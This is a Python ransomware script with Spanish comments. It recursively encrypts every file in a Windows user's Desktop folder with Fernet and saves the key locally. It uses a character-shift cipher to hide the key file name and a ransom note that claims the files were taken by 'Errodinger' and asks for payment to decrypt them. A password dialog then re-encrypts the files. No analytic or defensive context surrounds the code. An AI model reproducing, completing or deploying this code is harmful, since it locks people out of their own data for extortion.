from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import simpledialog
from concurrent.futures import ThreadPoolExecutor

def desencriptar(cadena):
    return ''.join(chr(ord(c) - 1) for c in cadena)

def generar_key():
    key = Fernet.generate_key()
    with open(desencriptar("lfp.lfp"), 'wb') as key_file:
        key_file.write(key)
    return key

def cargar_key():
    return open(desencriptar("lfp.lfp"), 'rb').read()

def encrypt_file(item, key):
    f = Fernet(key)
    with open(item, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(item, 'wb') as file:
        file.write(encrypted_data)

def encrypt(items, key):
    with ThreadPoolExecutor() as executor:
        executor.map(encrypt_file, items, [key]*len(items))

def get_all_files_in_directory(dir_path):
    files_list = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list

if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con su nombre de usuario
    all_files = get_all_files_in_directory(path_to_encrypt)

    key = generar_key()

    encrypt(all_files, key)

    with open(path_to_encrypt+'\\'+desencriptar("sfbenf.ufy"), 'w') as file:
        file.write(desencriptar('Gjdifspft fodsjuqbept qps fm ujup Fsspejohfs\n'))
        file.write(desencriptar('Ebnf vo fvttdsjqujpo qbsb eftfodsjqubs. Uibolt'))

    # Solicitar la contraseña al usuario
    root = tk.Tk()
    root.withdraw()
    password = simpledialog.askstring("Contraseña", "Introduce la contraseña para encriptar los archivos:", show='*')
    if password == "contraseña_correcta":
        encrypt(all_files, key)
    else:
        print("Contraseña incorrecta.")
